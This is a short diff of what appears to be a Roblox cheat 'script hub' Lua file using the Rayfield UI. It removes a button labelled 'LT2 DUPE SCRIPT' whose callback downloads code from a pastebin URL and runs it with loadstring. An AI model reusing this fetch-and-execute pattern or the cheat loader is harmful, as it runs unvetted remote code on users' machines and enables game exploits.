@@ -30,12 +30,6 @@ local Window = Rayfield:CreateWindow({
  local Tab = Window:CreateTab("Game supported", 4483362458) -- Title, Image
  local Section = Tab:CreateSection("Games we support")
 
- local Button = Tab:CreateButton({
-   Name = "LT2 DUPE SCRIPT",
-   Callback = function()
-      loadstring(game:HttpGet("https://pastebin.com/raw/yZ0XzuKq", true))()
-   end,
-})
 
 
 local Button = Tab:CreateButton({
